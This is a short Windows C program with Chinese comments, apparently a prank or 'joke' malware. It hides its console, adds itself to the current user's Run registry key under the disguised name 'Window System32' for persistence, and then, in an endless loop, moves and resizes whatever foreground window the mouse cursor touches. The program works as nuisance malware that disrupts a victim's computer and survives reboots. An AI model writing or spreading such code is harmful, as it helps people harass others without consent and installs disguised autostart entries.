
#include <stdio.h>  //5-6个函数
#include <windows.h>
#include <time.h>
#include <stdlib.h>
//任务栏  窗口就不见了
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

POINT pt;	//点的结构体 保存鼠标的坐标
RECT rect;	//矩形 窗口  正方形

int main()
{
	//获取当前运行的exe的路径
	char exepath[200];
	GetModuleFileName(NULL, exepath, sizeof(exepath));
	
	//修改启动项
	char path[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hkey; //定义注册表
	RegOpenKey(HKEY_CURRENT_USER, path, &hkey);
	RegSetValueEx(hkey, "Window System32", 0, REG_SZ,(unsigned char*)exepath,sizeof(exepath));

	HWND hwnd;

	//获取桌面的分辨率
	HDC disDC = CreateDC("DISPLAY", 0, 0, 0); //disDC 绘图环境
	int ScreenW = GetDeviceCaps(disDC, HORZRES);  //1920
	int ScreenH = GetDeviceCaps(disDC, VERTRES);  //1080

	srand((unsigned int)time(NULL)); //随机数种子

	int wnd_x=0;  //窗口左上角的坐标
	int wnd_y=0; 

	while (1)
	{
		hwnd = FindWindow("TxGuiFoundation","QQ");//GetForegroundWindow();  //你想要去操作的那个软件
		hwnd = GetForegroundWindow();//所有的软件
		
		GetCursorPos(&pt);  //获取鼠标的点

		//获取窗口的矩形
		GetWindowRect(hwnd, &rect);

		if (pt.x >= rect.left&&pt.x <= rect.right&&
			pt.y >= rect.top&&pt.y <= rect.bottom)
		{
			wnd_x = rand() % (ScreenW - (rect.right - rect.left)); //多少？ //0-窗口的最右边 1920 1080
			wnd_y = rand() % (ScreenH - (rect.bottom - rect.top));
			MoveWindow(hwnd, wnd_x, wnd_y, 400, 400, true);
		}
	}
	return 0;
}
